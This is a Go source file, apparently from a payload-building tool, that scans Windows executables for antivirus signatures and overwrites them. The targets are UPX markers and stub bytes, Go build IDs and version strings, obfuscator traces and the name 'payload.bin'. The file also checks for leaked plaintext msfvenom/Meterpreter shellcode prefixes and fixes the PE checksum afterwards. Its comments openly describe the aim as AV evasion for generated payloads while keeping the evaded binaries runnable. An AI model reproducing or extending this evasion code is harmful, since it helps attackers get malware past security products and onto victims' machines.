package util

import (
	"bytes"
	"crypto/rand"
	"encoding/binary"
	"fmt"
	"os"
	"path/filepath"
	"strings"
)

// AVSignatureHit 查杀特征命中项
type AVSignatureHit struct {
	Name     string `json:"name"`
	Category string `json:"category"`
	Count    int    `json:"count"`
}

// AVSignatureResult 扫描/规避结果
type AVSignatureResult struct {
	FilePath string           `json:"filePath"`
	Found    []AVSignatureHit `json:"found"`
	Evaded   []AVSignatureHit `json:"evaded"`
}

type avSignatureRule struct {
	Name        string
	Category    string
	Pattern     []byte
	Replacement []byte                   // 非空则替换；为空则擦除/混淆
	ScrubFunc   func([]byte, int) []byte // 自定义处理，优先级高于 Replacement
}

var avSignatureRules = []avSignatureRule{
	{Name: "UPX段名_UPX0", Category: "packer", Pattern: []byte("UPX0"), Replacement: []byte("text")},
	{Name: "UPX段名_UPX1", Category: "packer", Pattern: []byte("UPX1"), Replacement: []byte("text")},
	{Name: "UPX段名_UPX2", Category: "packer", Pattern: []byte("UPX2"), Replacement: []byte("text")},
	{Name: "UPX签名", Category: "packer", Pattern: []byte("UPX!"), Replacement: []byte("APP!")},
	{Name: "UPX存根", Category: "shellcode", Pattern: []byte{0x53, 0x56, 0x57, 0x55, 0x48}, Replacement: []byte{0x90, 0x90, 0x90, 0x90, 0x90}},
	{Name: "Go_BuildID", Category: "go", Pattern: []byte("Go build ID: \""), ScrubFunc: scrubGoBuildID},
	{Name: "Garble标识", Category: "obfuscator", Pattern: []byte("garble"), Replacement: nil, ScrubFunc: scrubASCIIKeyword},
	{Name: "Garble路径", Category: "obfuscator", Pattern: []byte(".garble"), Replacement: nil, ScrubFunc: scrubASCIIKeyword},
	{Name: "Go运行时路径", Category: "go", Pattern: []byte("runtime."), Replacement: nil, ScrubFunc: scrubASCIIKeywordPartial},
	{Name: "Reflect包路径", Category: "go", Pattern: []byte("reflect."), Replacement: nil, ScrubFunc: scrubASCIIKeywordPartial},
	// 生成工具模块路径 / 本地临时目录路径（-trimpath 未启用时可能泄露本机用户名与目录结构）
	{Name: "生成工具标识", Category: "go", Pattern: []byte("EasyTools"), Replacement: nil, ScrubFunc: scrubASCIIKeyword},
	// -X 注入的构建信息键名（固定键名 + 随机值，键名属静态特征）
	{Name: "注入构建键_BuildVersion", Category: "go", Pattern: []byte("main.BuildVersion"), Replacement: nil, ScrubFunc: scrubASCIIKeyword},
	{Name: "注入构建键_BuildID", Category: "go", Pattern: []byte("main.BuildID"), Replacement: nil, ScrubFunc: scrubASCIIKeyword},
	{Name: "注入构建键_BuildTime", Category: "go", Pattern: []byte("main.BuildTime"), Replacement: nil, ScrubFunc: scrubASCIIKeyword},
	{Name: "注入构建键_BuildTag", Category: "go", Pattern: []byte("main.BuildTag"), Replacement: nil, ScrubFunc: scrubASCIIKeyword},
	// Go 工具链默认写入的 VCS 构建信息（可能泄露 git 仓库地址/提交哈希）
	{Name: "VCS构建信息", Category: "go", Pattern: []byte("vcs.revision"), Replacement: nil, ScrubFunc: scrubASCIIKeyword},
	{Name: "VCS修改时间", Category: "go", Pattern: []byte("vcs.time"), Replacement: nil, ScrubFunc: scrubASCIIKeyword},
	// 生成器残留的固定输出文件名
	{Name: "载荷文件名", Category: "go", Pattern: []byte("payload.bin"), Replacement: nil, ScrubFunc: scrubASCIIKeyword},
}

// msfPlainPrefixes msfvenom x64 系列载荷的通用明文前缀（fc 48 83 e4 f0 = cld; and rsp,-10h; call $+5），
// 是 W64.Meterpreter / Trojan 家族静态签名的主要锚点。正常加密内联产物中不应出现；
// 若扫描命中，说明载荷在某环节以明文落进了产物（编码选择/内联回退 bug 或旧版管线）。
var msfPlainPrefixes = [][]byte{
	{0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8},       // 标准 x64 prologue + call
	{0xfc, 0xe8, 0x82, 0x00, 0x00, 0x00},       // x86 变体 prologue
	{0xfc, 0x48, 0x83, 0xe4, 0xf0},             // 兜底：仅 prologue 头
}

// IsPEFile 判断是否为 PE 可执行文件
func IsPEFile(path string) bool {
	data, err := os.ReadFile(path)
	if err != nil || len(data) < 64 {
		return false
	}
	if data[0] != 'M' || data[1] != 'Z' {
		return false
	}
	peOff := binary.LittleEndian.Uint32(data[0x3C:])
	if int(peOff)+4 > len(data) {
		return false
	}
	return bytes.Equal(data[peOff:peOff+4], []byte("PE\x00\x00"))
}

// peExecGuard PE 可执行段保护：整文件字节擦除只允许落在非可执行的数据段内，
// 避免把 .text 机器码/元数据当 ASCII 字符串改写导致产物崩溃（曾经造成免杀产物不可运行）。
type peExecGuard struct {
	ranges [][2]int // [start,end) 闭开区间，按序
}

// newPeExecGuard 解析 PE 段表；非 PE 返回空保护（保持旧行为）。
func newPeExecGuard(data []byte) *peExecGuard {
	g := &peExecGuard{}
	if len(data) < 0x40 || data[0] != 'M' || data[1] != 'Z' {
		return g
	}
	peOff := int(binary.LittleEndian.Uint32(data[0x3C:]))
	if peOff+24+4 > len(data) || !bytes.Equal(data[peOff:peOff+4], []byte("PE\x00\x00")) {
		return g
	}
	numSec := int(binary.LittleEndian.Uint16(data[peOff+6:]))
	optSize := int(binary.LittleEndian.Uint16(data[peOff+20:]))
	secTab := peOff + 24 + optSize
	const secSize = 40
	for i := 0; i < numSec; i++ {
		off := secTab + i*secSize
		if off+secSize > len(data) {
			break
		}
		chars := binary.LittleEndian.Uint32(data[off+36:])
		rawSize := int(binary.LittleEndian.Uint32(data[off+16:]))
		rawOff := int(binary.LittleEndian.Uint32(data[off+20:]))
		if rawSize <= 0 || rawOff <= 0 {
			continue
		}
		// IMAGE_SCN_MEM_EXECUTE = 0x20000000
		if chars&0x20000000 != 0 {
			end := rawOff + rawSize
			if end > len(data) {
				end = len(data)
			}
			if rawOff < end {
				g.ranges = append(g.ranges, [2]int{rawOff, end})
			}
		}
	}
	return g
}

// blocked 判断某字节偏移是否落在可执行段内
func (g *peExecGuard) blocked(idx int) bool {
	if g == nil {
		return false
	}
	for _, r := range g.ranges {
		if idx >= r[0] && idx < r[1] {
			return true
		}
		if idx < r[0] {
			return false
		}
	}
	return false
}

// blockedSpan 判断 [idx, idx+span) 内是否有任何可执行段字节
func (g *peExecGuard) blockedSpan(idx, span int) bool {
	if g == nil {
		return false
	}
	end := idx + span
	for _, r := range g.ranges {
		if idx < r[1] && end > r[0] {
			return true
		}
	}
	return false
}

// ScanAVSignatures 扫描二进制中的常见查杀特征（不修改文件）
func ScanAVSignatures(filePath string) (*AVSignatureResult, error) {
	data, err := os.ReadFile(filePath)
	if err != nil {
		return nil, fmt.Errorf("读取文件失败: %w", err)
	}
	result := &AVSignatureResult{FilePath: filePath}
	for _, rule := range avSignatureRules {
		count := bytesCount(data, rule.Pattern)
		if count > 0 {
			result.Found = append(result.Found, AVSignatureHit{Name: rule.Name, Category: rule.Category, Count: count})
		}
	}
	// Go 版本号特征（3.xx / 1.xx 连续出现在 runtime 相关区域）
	if n := countGoVersionLeaks(data); n > 0 {
		result.Found = append(result.Found, AVSignatureHit{Name: "Go版本泄露", Category: "go", Count: n})
	}
	// msf x64/x86 载荷明文前缀泄漏（正常加密内联产物不应命中）
	for _, p := range msfPlainPrefixes {
		if c := bytesCount(data, p); c > 0 {
			result.Found = append(result.Found, AVSignatureHit{Name: "msf载荷明文前缀", Category: "shellcode", Count: c})
		}
	}
	return result, nil
}

// ScanAndEvadeAVSignatures 扫描并规避常见查杀特征
func ScanAndEvadeAVSignatures(filePath string) (*AVSignatureResult, error) {
	before, err := ScanAVSignatures(filePath)
	if err != nil {
		return nil, err
	}

	data, err := os.ReadFile(filePath)
	if err != nil {
		return nil, fmt.Errorf("读取文件失败: %w", err)
	}
	original := append([]byte(nil), data...)
	guard := newPeExecGuard(data)

	// UPX 相关规则只应在目标确为 UPX 加壳产物时生效：
	// 普通 Go 编译产物里若恰好出现 "UPX0/UPX1/UPX!" 文本或壳存根字节序
	// （PUSH RBX/RSI/RDI/RBP 等），全文件盲替换会把正常指令 NOP 掉/改坏字符串，
	// 轻则特征擦除无效，重则运行期直接崩溃。
	packed := bytes.Contains(data, []byte("UPX!")) ||
		bytes.Contains(data, []byte("UPX0")) ||
		bytes.Contains(data, []byte("UPX1")) ||
		bytes.Contains(data, []byte("UPX2"))

	for _, rule := range avSignatureRules {
		if strings.HasPrefix(rule.Name, "UPX") && !packed {
			continue
		}
		if rule.ScrubFunc != nil {
			data = applyScrubFunc(data, rule.Pattern, rule.ScrubFunc, guard)
		} else if len(rule.Replacement) > 0 {
			data = replaceAllBytes(data, rule.Pattern, rule.Replacement, guard)
		}
	}
	data = scrubGoVersionLeaks(data, guard)

	if !bytes.Equal(original, data) {
		if err := os.WriteFile(filePath, data, 0o666); err != nil {
			return nil, fmt.Errorf("写回文件失败: %w", err)
		}
		// PE 校验和修复
		if IsPEFile(filePath) {
			_ = fixPEChecksum(filePath)
		}
	}

	after, _ := ScanAVSignatures(filePath)
	result := &AVSignatureResult{FilePath: filePath, Found: before.Found}
	for _, hit := range before.Found {
		still := findHit(after.Found, hit.Name)
		if still == nil || still.Count < hit.Count {
			result.Evaded = append(result.Evaded, hit)
		}
	}
	return result, nil
}

func findHit(hits []AVSignatureHit, name string) *AVSignatureHit {
	for i := range hits {
		if hits[i].Name == name {
			return &hits[i]
		}
	}
	return nil
}

func bytesCount(data, pattern []byte) int {
	n := 0
	for i := 0; i+len(pattern) <= len(data); i++ {
		if bytes.Equal(data[i:i+len(pattern)], pattern) {
			n++
		}
	}
	return n
}

func replaceAllBytes(data, pattern, replacement []byte, guard *peExecGuard) []byte {
	if len(pattern) == 0 || len(replacement) == 0 {
		return data
	}
	for i := 0; i+len(pattern) <= len(data); i++ {
		if guard.blockedSpan(i, len(pattern)) {
			continue
		}
		if bytes.Equal(data[i:i+len(pattern)], pattern) {
			copy(data[i:i+len(replacement)], replacement)
			if len(replacement) < len(pattern) {
				for j := i + len(replacement); j < i+len(pattern); j++ {
					data[j] = 0x00
				}
			}
		}
	}
	return data
}

func applyScrubFunc(data, pattern []byte, fn func([]byte, int) []byte, guard *peExecGuard) []byte {
	for i := 0; i+len(pattern) <= len(data); i++ {
		if guard.blockedSpan(i, len(pattern)+128) {
			continue // 命中区域触及可执行段（含后续 ASCII 扩展范围）一律跳过
		}
		if bytes.Equal(data[i:i+len(pattern)], pattern) {
			data = fn(data, i)
		}
	}
	return data
}

func scrubGoBuildID(data []byte, idx int) []byte {
	// 兼容两种格式，并连同前缀/引号一起清理（避免扫描规则持续命中）：
	// 旧版：Go build ID: "xxxxx"
	// Go 1.20+：Go build ID: xxxxx（无引号，到空白/不可打印字符为止）
	start := idx
	for start < len(data) && data[start] == ' ' {
		start++
	}
	// 找到内容起点（跳过前缀与引号）
	marker := []byte("Go build ID: ")
	if mi := bytes.Index(data[start:], marker); mi >= 0 {
		start = start + mi + len(marker)
	}
	for start < len(data) && (data[start] == '"' || data[start] == ' ') {
		start++
	}
	end := start
	for end < len(data) {
		b := data[end]
		if b == '"' || b == '\n' || b == '\r' || b == '\t' || b == ' ' || b < 0x20 || b >= 0x7F {
			break
		}
		end++
	}
	for j := idx; j < end; j++ {
		if data[j]>>4 != 0xF {
			data[j] = randomAlphaNum()
		}
	}
	return data
}

func scrubASCIIKeyword(data []byte, idx int) []byte {
	end := idx
	for end < len(data) && data[end] >= 0x20 && data[end] < 0x7F {
		end++
	}
	for j := idx; j < end; j++ {
		data[j] = randomAlphaNum()
	}
	return data
}

func scrubASCIIKeywordPartial(data []byte, idx int) []byte {
	// 仅混淆关键字后 4 字节，避免破坏过多结构
	limit := idx + 12
	if limit > len(data) {
		limit = len(data)
	}
	for j := idx + 4; j < limit; j++ {
		if data[j] != '.' && data[j] != '/' {
			data[j] = randomAlphaNum()
		}
	}
	return data
}

func randomAlphaNum() byte {
	const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	b := make([]byte, 1)
	_, _ = rand.Read(b)
	return chars[int(b[0])%len(chars)]
}

func countGoVersionLeaks(data []byte) int {
	// 检测明文 Go 版本串，如 "go1.22" "go1.24"
	n := 0
	markers := []string{"go1.18", "go1.19", "go1.20", "go1.21", "go1.22", "go1.23", "go1.24", "go1.25", "go1.26", "go1.27"}
	for _, m := range markers {
		n += bytesCount(data, []byte(m))
	}
	return n
}

func scrubGoVersionLeaks(data []byte, guard *peExecGuard) []byte {
	markers := []string{"go1.18", "go1.19", "go1.20", "go1.21", "go1.22", "go1.23", "go1.24", "go1.25", "go1.26", "go1.27"}
	for _, m := range markers {
		p := []byte(m)
		for i := 0; i+len(p) <= len(data); i++ {
			if guard.blockedSpan(i, len(p)) {
				continue
			}
			if bytes.Equal(data[i:i+len(p)], p) {
				for j := i; j < i+len(p); j++ {
					data[j] = 'x'
				}
			}
		}
	}
	return data
}

func fixPEChecksum(filePath string) error {
	data, err := os.ReadFile(filePath)
	if err != nil {
		return err
	}
	_, is64, err := locateSubsystemAndCheckSumOffsets(data)
	if err != nil {
		return err
	}
	checkSumOffset := getCheckSumOffset(is64, data)
	if checkSumOffset == 0 {
		return fmt.Errorf("无法定位 CheckSum")
	}
	for i := 0; i < 4; i++ {
		data[checkSumOffset+uint32(i)] = 0
	}
	binary.LittleEndian.PutUint32(data[checkSumOffset:], calcPEChecksum(data))
	return os.WriteFile(filePath, data, 0o666)
}

// LogAVSignatureWarnings 编译后检查并输出告警（不自动规避）
func LogAVSignatureWarnings(filePath string) {
	if !IsPEFile(filePath) {
		return
	}
	result, err := ScanAVSignatures(filePath)
	if err != nil {
		fmt.Printf("[!] 查杀特征扫描失败 %s: %v\n", filepath.Base(filePath), err)
		return
	}
	if len(result.Found) == 0 {
		return
	}
	fmt.Printf("[!] 警告: %s 检测到 %d 类常见查杀特征，请手动执行「去UPX/特征」规避:\n", filepath.Base(filePath), len(result.Found))
	for _, hit := range result.Found {
		fmt.Printf("    - [%s] %s (x%d)\n", hit.Category, hit.Name, hit.Count)
	}
}
